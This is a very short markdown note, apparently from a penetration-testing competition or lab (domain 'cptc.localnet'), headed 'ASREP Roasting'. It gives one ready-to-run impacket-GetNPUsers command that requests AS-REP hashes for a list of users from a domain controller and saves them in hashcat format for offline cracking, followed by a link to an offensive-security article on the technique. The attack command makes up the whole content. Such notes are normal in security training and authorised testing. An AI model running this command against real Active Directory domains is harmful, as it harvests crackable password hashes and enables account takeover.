# ASREP Roasting
```bash
impacket-GetNPUsers -request -outputfile cptc.users.asrep -format hashcat -usersfile unpaid.users.clean.txt -dc-ip 192.168.220.102 cptc.localnet/
```
[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
